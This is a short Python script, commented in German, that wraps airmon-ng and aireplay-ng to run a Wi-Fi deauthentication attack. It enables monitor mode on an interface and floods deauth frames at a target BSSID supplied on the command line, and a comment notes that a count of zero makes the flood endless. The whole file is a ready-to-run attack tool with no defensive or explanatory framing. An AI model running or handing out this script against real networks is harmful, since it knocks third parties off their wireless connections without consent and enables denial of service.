#!/usr/bin/env python3
import subprocess
import time

class DeauthAttack:
    def __init__(self, interface="wlan0", bssid=None, count=0):
        self.interface = interface
        self.bssid = bssid
        self.count = count
        self.mon_iface = None

    def enable_monitor(self):
        result = subprocess.run(["sudo", "airmon-ng", "start", self.interface], capture_output=True, text=True)
        # Finde Monitor-Interface (normalerweise wlan0mon)
        self.mon_iface = self.interface + "mon"
        print(f"[*] Monitor-Modus aktiviert auf {self.mon_iface}")
        return self.mon_iface

    def attack(self):
        self.enable_monitor()
        cmd = [
            "sudo", "aireplay-ng",
            "-0", str(self.count),   # 0 = unendlich
            "-a", self.bssid,
            self.mon_iface
        ]
        subprocess.run(cmd)

    def restore(self):
        subprocess.run(["sudo", "airmon-ng", "stop", self.mon_iface])

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <BSSID> [interface]")
        sys.exit(1)
    bssid = sys.argv[1]
    iface = sys.argv[2] if len(sys.argv) > 2 else "wlan0"
    da = DeauthAttack(interface=iface, bssid=bssid, count=10)
    da.attack()